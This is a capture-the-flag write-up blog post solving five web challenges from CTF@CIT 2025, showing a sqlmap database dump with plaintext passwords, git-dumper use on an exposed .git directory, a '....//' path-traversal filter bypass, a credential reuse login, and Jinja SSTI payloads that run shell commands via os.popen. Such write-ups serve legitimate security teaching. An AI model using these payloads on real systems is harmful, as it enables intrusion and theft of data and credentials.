---
layout: post
title: CTF@CIT 2025 Web Writeup
categories: [CTF, Writeup]
tags: [web, lfi, sqli]
date: 2025-04-30 05:12 +0900
media_subpath: 'https:////raw.githubusercontent.com/T3l3sc0p3/ctf-writeups/master/CTF%40CIT-2025/'
image:
  path: banner.png
---

Recently, I cleared all web challenges in CTF@CIT 2025 and this is my writeup about it. Hope you like it~

# Breaking Authentication (750 pts)

![BreakingAuthentication](Web/img/breakingauthentication.png)

At first, I tried `'OR 1=1;--` and I got an error. So this is definitely **SQL Injection** and it uses **MySQL**

Next, I just need to use `sqlmap` to dump the flag :D

```sh
sqlmap -u 'http://23.179.17.40:58001' --method=POST --data="username=123&password=123&login=Login" --dbs --dump
Database: app
Table: secrets
[1 entry]
+--------+-----------------------+
| name   | value                 |
+--------+-----------------------+
| flag   | CIT{36b0efd6c2ec7132} |
+--------+-----------------------+

Database: app
Table: users
[4 entries]
+---------+----------+--------------+----------+
| email   | fullname | password     | username |
+---------+----------+--------------+----------+
| <blank> | <blank>  | m1n3r41s     | hank     |
| <blank> | <blank>  | 9f3IC3uj9^zZ | admin    |
| <blank> | <blank>  | M4GN375      | jesse    |
| <blank> | <blank>  | b4byb1u3     | walter   |
+---------+----------+--------------+----------+
```

`Flag: CIT{36b0efd6c2ec7132}`

# Commit & Order: Version Control Unit (782 pts)

![CommitOrderVersionControlUnit](Web/img/commitorderversioncontrolunit.png)

As you see in the title and description, this is probably a vulnerability or a problem that related to [git](https://git-scm.com/)

Some devs may forget to exclude `.git` directory when deploying, which can lead to the exposure of the entire source code, creds, authen keys, and more if someone discovers it

First, I tried `http://23.179.17.40:58002/.git/` and I got 403 response. However, this means that the `.git` directory is existed and not properly excluded so I could exploit it :))

Here I used `git-dumper` to clone that repo

```sh
git-dumper http://23.179.17.40:58002/.git/ test
```

Then I checked the changes in the commit using `git diff master <commit-id>` until I reached the commit `68f8fcd`

In this commit, I found this line:

![flag](Web/img/commitorderversioncontrolunit-flag.png)

This is a base64, so I decode it and get the flag

`Flag: CIT{5d81f7743f4bc2ab}`

# How I Parsed your JSON (868 pts)

![HowIParsedyourJSON](Web/img/howiparsedyourjson.png)

This challenge is quite interesting because I was wrong at first. When I saw the **SELECT** query, column, and table, I immediately concluded that it was an **SQL Injection** vulnerability

I tried `/select?record=*&container=employees` and it shows all the information as it was actually dumped, but everything is useless

Next, I changed to `/select?record=*&container[]=employees`, add square brackets to turn it into array. This gives me a bunch of errors and also, leak a part of source code

While analyzing this source code, I saw something that make me doubt about my initial conclusion:

```python
File "/app/app.py", line 18, in select

@app.route('/select')

def select():
    container_name = request.args.get('container')
    record_name = request.args.get('record')
    container_name = clean_container_name(container_name)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    container_path = os.path.join('containers/', container_name)
    try:
        with open(container_path, 'r') as container_file:
            if record_name == '*':

File "/app/app.py", line 36, in clean_container_name

    return render_template('index.html', data=return_data, container=container_name)

def clean_container_name(n):

    n = os.path.splitext(n)[0]
        ^^^^^^^^^^^^^^^^^^^
    n = n.replace('../', '')
    return n
```

I realized that this is actually not an **SQL Injection** but a **Path Traversal** vulnerability

Look carefully, I saw that it was trying to open a file based on the `container` param and maybe if `record` param is `*`? ¯\_(ツ)_/¯

In `clean_container_name` function, it removes the file extension and also filters out `../`

However, it only removes these once, so we can easily bypass by doubling it like `....//`

Combine all of these, I tested `/select?record=*&container=....//secrets.txt.txt` and I got the flag

![flag](Web/img/howiparsedyourjson-flag.png)

`Flag: CIT{235da65aa6444e27}`

# Keeping Up with the Credentials (970 pts)

![KeepingUpwiththeCredentials](Web/img/keepingupwiththecredentials.png)

In previous web challenges like **Breaking Authentication** and **How I Parsed your JSON**, you may notice that there is a credential show up: `admin:9f3IC3uj9^zZ`

When using this credential to login, it redirects to `/debug.php`. If you see it similar, this is from **Commit & Order: Version Control Unit** challenge

So I tried to visit `/admin.php` and I was logged out

This is a part of `index.php` source code from **Commit & Order: Version Control Unit**:

```php
<?php

session_start();

if (!isset($_SESSION['username'])) {
    $_SESSION['username'] = 'loggedout';
}

if (isset($_POST['username']) && isset($_POST['password'])){

	$username = $_POST['username'];
	$password = $_POST['password'];

    if ($username == 'admin' && $password == '9f3IC3uj9^zZ'){
        $_SESSION['username'] = $username;
        header('Location: /admin.php', true);
        exit();
    }
    else {
        $_SESSION['username'] = $username;
	  $_SESSION['message'] = 'Invalid username or password.';
    }
}
?>
```

You see the code uses a POST request, while the challenge used a GET request. So I used Burp Suite to change the method to POST and then sent the request again

This time, it redirected me to `/admin.php` and I got the flag

`Flag: CIT{7bf610e96ade83db}`

# Mr. Chatbot (973 pts)

![MrChatbot](Web/img/mrchatbot.png)

Initially, when tested some stuffs of this challenge, I thought that it was a very strict **Prompt Injection** vulnerability. However, I realized it was much deeper than that

After enter **admin** or any strings as username, it will generate a JWT session in cookie, which decodes to `{"admin":"0","name":"admin"}`

First, I tried to crack it but no luck, so I add `admin=1` to POST request. However, this made JWT become weirded so I couldn't decode it using normal web tools

Here I used `flask-unsign` to decode it

![decode](Web/img/mrchatbot-flask-unsign.png)

As you can see, there is another base64 inside this one and decode it returns the username that I entered

So I guess that the server probably use a template like `f"{username}"` for both **name** and **uid**

Noticed that the server are using Python, I tried **Server-Side Template Injection (SSTI)** payload on username combine with `admin=1`

This is the payload from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md)

```python
{{namespace.__init__.__globals__.os.popen('id').read()}}
```

After that, I take JWT session, decode it and decode the inside base64. And it actually works

Now I just need to `cat secrets.txt` file

```python
{{namespace.__init__.__globals__.os.popen('cat secrets.txt').read()}}
```

![flag](Web/img/mrchatbot-flag.png)

`Flag: CIT{18a7fbedb4f3548f}`

![clear](https://i.imgur.com/sptDLTz.png)
